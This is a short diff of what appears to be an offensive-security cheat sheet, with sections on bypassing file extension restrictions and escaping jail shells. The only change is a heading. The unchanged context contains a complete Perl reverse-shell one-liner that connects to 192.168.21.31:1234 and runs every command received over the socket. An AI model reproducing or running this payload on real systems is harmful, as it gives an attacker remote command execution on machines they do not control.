@@ -36,8 +36,7 @@ Bypass File Extentension Restrictions
 ```
 
 # ESCAPE JAIL SHELL
-
-# USING PERL REVERSE SHELL INTO PYTHON TTY
+#### USING PERL REVERSE SHELL INTO PYTHON TTY
 
 ```
 /usr/bin/perl -MIO -e '$p=fork;exit,if($p);foreach my $key(keys %ENV){if($ENV{$key}=~/(.*)/){$ENV{$key}=$1;}}$c=new IO::Socket::INET(PeerAddr,"192.168.21.31:1234");STDIN->fdopen($c,r);$~->fdopen($c,w);while(<>){if($_=~ /(.*)/){system $1;}};'
